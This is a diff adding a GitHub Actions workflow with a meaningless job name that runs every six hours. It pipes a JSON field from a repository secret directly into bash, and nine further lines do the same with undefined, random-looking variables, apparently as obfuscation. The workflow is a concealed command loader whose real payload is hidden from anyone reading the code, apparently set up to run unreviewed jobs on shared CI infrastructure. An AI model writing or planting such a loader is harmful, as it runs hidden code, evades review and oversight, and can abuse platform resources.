@@ -1,0 +1,26 @@
+name: yangchuannan7615
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yangchuannan7615
+        env:
+          koe1: ${{ secrets.koe1 }}
+        run: |
+          echo $koe1 | jq -r .ajh204 | /bin/bash
+          echo $bsjm783 | jq -r .m80483 | /bin/bash
+          echo $pxow25368 | jq -r .ppnu3 | /bin/bash
+          echo $fu83 | jq -r .n70166 | /bin/bash
+          echo $d38520 | jq -r .w87239 | /bin/bash
+          echo $rd8 | jq -r .gy2 | /bin/bash
+          echo $j3487 | jq -r .qhbxq437 | /bin/bash
+          echo $vj4108 | jq -r .yfx8949 | /bin/bash
+          echo $pr84675 | jq -r .bf589 | /bin/bash
+          echo $bjqun0 | jq -r .sa798 | /bin/bash
+
